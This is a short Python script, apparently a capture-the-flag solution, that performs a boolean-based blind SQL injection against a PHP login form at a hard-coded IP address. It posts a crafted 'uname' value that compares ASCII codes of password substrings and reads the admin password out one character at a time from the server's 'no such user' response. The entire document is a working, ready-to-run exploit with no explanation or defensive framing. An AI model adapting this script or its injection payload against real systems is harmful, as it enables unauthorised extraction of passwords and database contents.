#!/usr/bin/env python3
import urllib.request, string
import urllib.parse
dict = range(30, 123)
flag = ''
def doit(data):
    url ='http://202.112.26.124:8080/fb69d7b4467e33c71b0153e62f7e2bf0/index.php'
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
    values = {'uname' : data,'pwd' : '123'}
    data = urllib.parse.urlencode(values).encode('ascii')
    req = urllib.request.Request(url, data)
    response = urllib.request.urlopen(req)
    return response.read().decode("utf8")

for i in range (1, 31):
    for c in dict:
        payload = "admin'&&(ascii(right(left((`pwd`),{}),1))<{})&&1='1".format(i,c)
        data = doit(payload)
        if data.find('no such user') == -1:
            flag += chr(c-1)
            print(flag)
            break